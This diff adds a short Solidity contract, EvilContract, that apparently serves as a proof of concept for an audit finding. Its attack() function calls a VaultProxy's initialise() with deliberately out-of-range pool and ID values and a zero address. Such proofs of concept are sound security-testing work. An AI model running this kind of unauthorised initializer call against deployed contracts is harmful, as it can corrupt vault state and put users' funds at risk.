@@ -1,0 +1,25 @@
+import './library/UtilLib.sol';
+import './interfaces/IVaultProxy.sol';
+
+contract EvilContract {
+    IVaultProxy public vaultProxy;
+
+    constructor(IVaultProxy _vaultProxy) {
+        vaultProxy = _vaultProxy;
+    }
+
+    // Perform an attack by initializing the vault with invalid _poolId and _id values
+    function attack() external {
+        // Provide malicious values that are outside the expected range
+        uint8 maliciousPoolId = 255;
+        uint256 maliciousId = 9999;
+
+        // Call the initialize function of the VaultProxy contract
+        vaultProxy.initialise(
+            false,
+            maliciousPoolId,
+            maliciousId,
+            address(0)
+        );
+    }
+}
